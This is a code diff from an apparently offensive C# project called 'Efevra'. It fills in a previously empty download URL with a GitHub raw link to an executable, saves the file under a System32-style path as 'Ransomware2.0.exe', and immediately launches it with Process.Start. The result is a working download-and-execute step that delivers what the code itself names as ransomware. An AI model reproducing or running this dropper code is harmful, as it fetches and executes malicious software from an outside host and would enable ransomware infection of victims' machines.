@@ -67,7 +67,7 @@ namespace Efevra
                 ServicePointManager.Expect100Continue = true;
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                 WebClient webClient = new WebClient();
-                webClient.DownloadFile("", @"C:\Program Files\System32\Ransomware2.0.exe"); //LINK
+                webClient.DownloadFile("https://github.com/IkigaiHack/Efevra/raw/main/Efevra/Efevra/bin/Debug/Efevra.exe", @"C:\Program Files\System32\Ransomware2.0.exe"); //LINK
 
                 Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
 
